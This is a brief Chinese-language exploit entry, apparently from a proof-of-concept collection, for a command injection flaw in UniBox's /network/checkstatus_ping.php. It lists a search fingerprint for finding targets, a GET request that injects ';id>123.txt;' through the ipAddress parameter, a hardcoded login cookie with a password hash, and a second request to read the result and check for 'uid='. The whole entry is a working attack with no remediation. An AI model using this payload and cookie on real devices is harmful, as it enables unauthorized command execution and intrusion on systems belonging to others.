# uniboxcheckstatus_ping.php命令执行漏洞

- **系统**：uniboxcheckstatus_ping.php　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="UniBox"`
- **请求**：`GET /network/checkstatus_ping.php?ipAddress=;id>123.txt; HTTP/1.1`
- **关键头**：`Cookie: user=unibox; pass=294a3d333d2f6b7e121594189fce9a72`

**请求体 / payload**
```
GET /network/123.txt HTTP/1.1
Host:
Cookie: user=unibox; pass=294a3d333d2f6b7e121594189fce9a72
```
- **预期**：200　|　uid=